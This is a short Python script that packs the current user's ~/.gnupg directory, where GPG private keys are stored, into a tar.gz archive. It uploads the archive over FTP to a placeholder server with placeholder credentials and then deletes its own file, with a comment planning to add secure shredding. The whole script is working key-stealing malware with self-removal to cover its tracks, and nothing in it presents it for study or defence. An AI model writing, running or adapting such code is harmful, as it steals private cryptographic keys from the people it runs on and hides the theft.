import tarfile, os, ftplib
from pathlib import Path
from sys import argv

# Setup paths and names:
gnu_path = "{0}/.gnupg".format(Path.home())
tarname = str(Path.home()).split("/")[-1]
tarfilepath = "{0}.tar.gz".format(tarname)

# Get data and create file:
try:
    tar = tarfile.open(tarfilepath, "w:gz")
    tar.add(gnu_path, arcname = tarname)
    tar.close()
except Exception as error:
    print(error)

# Send file:
try:
    payload = open(tarfilepath, "rb")
    session = ftplib.FTP("ftp.server.com", "username", "password")
    session.storbinary(tarname, payload)
    session.quit()
    payload.close()
except Exception as error:
    print(error)

# Autodestroy:
# TO-DO autoshred.
os.remove(argv[0])
